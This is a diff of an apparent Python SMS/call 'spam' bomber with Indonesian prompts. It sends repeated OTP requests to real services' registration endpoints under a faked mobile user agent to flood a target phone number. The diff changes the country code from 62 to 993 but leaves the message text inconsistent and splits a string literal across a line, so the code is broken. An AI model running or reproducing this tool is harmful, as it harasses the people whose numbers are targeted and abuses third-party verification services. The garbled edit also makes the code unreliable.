@@ -34,8 +34,8 @@ def input():
   if len(nom) < 5:
     print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
     input()
-  elif nom.startswith(tuple(["62","+62","0"])):
-    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
+  elif nom.startswith(tuple(["993","+993","0"])):
+    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +993, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
     input()
   else:
     global jum
@@ -43,14 +43,14 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'993'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
   else:
    gagal("1","sms","asakita")
 def sunchila():
-#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
+#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=993")
  # if json.loads(hih.text)["result"] == 'true':
    sukses("2","sms","sunchila")
   #else:
@@ -62,7 +62,8 @@ def nutriclub():
   else:
    gagal("3","call","nutriclub")
 def asani():
-  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
+  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"993
+"+nom,"email":"akuntesnuyul@gmail.com"}))
   if json.loads(j.text)["message"] == 'OTP Terkirim ':
    sukses("4","sms","asani")
   else:
